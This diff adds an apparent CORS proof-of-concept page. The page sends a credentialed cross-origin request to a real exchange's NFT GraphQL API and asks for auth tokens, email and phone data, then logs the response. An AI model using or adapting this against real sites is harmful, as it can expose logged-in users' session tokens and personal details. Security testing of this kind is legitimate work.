@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Test - GraphQL</title>
+</head>
+<body>
+<script>
+  // GraphQL query and fragment
+  var data = {
+    query: `
+      fragment MeResponse on Me {
+        uuid
+        verified
+        id
+        username
+        email
+        countryCode
+        phoneNumber
+        isPhoneNumberVerified
+      }
+
+      mutation continueAuthentication($clientOtpCode: String, $emailOtpCode: String, $smsOtpCode: String) {
+        continueAuthentication(
+          clientOtpCode: $clientOtpCode
+          emailOtpCode: $emailOtpCode
+          smsOtpCode: $smsOtpCode
+        ) {
+          __typename
+          ... on AuthV2 {
+            me {
+              ...MeResponse
+              __typename
+            }
+            token
+            __typename
+          }
+          ... on ContinueAuth {
+            requiredSteps
+            token
+            unauthorizedMe {
+              email
+              name
+              username
+              uuid
+              registrationCompleted
+              __typename
+            }
+            __typename
+          }
+        }
+      }
+    `,
+    variables: {
+      clientOtpCode: null,
+      emailOtpCode: null,
+      smsOtpCode: null
+    }
+  };
+  // Create XHR
+
+  var req = new XMLHttpRequest();
+  console.log(document.cookies,"cookies")
+  req.open('POST', 'https://crypto.com/nft-api/graphql', true);
+  req.withCredentials = true; // include cookies / JWT
+  req.setRequestHeader('Content-Type', 'application/json');
+ // req.setRequestHeader('Authorization', Authorization);
+  //req.setRequestHeader('Sec-Ch-Ua-Platform', "Windows");
+console.log(document.cookies,"cookies")
+  req.onload = function() {
+    console.log("Response from server:", this.responseText);
+  };
+
+  req.onerror = function() {
+    console.error("Request failed");
+  };
+console.log(document.cookies,"cookies")
+  req.send(JSON.stringify(data));
+</script>
+</body>
+</html>
